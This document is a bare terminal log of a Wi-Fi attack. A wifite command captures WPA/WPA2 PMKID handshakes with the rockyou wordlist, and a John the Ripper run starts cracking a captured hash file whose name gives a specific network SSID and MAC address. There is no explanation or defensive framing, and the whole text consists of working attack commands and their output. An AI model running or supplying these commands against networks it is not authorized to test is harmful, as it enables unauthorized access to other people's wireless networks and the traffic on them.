


```
sudo wifite --kill --dict /usr/share/wordlists/rockyou.txt --pmkid
```


```
john hs/pmkid_INFINITUMFFEB24_F4-9E-EF-AB-6F-ED_2024-05-14T15-48-53.22000 -w=/usr/share/wordlists/rockyou.txt 
Warning: detected hash type "wpapsk", but the string is also recognized as "wpapsk-pmk"
Use the "--format=wpapsk-pmk" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (wpapsk, WPA/WPA2/PMF/PMKID PSK [PBKDF2-SHA1 128/128 ASIMD 4x])
Will run 6 OpenMP threads
Note: Minimum length forced to 8 by format
Press 'q' or Ctrl-C to abort, almost any other key for status

```

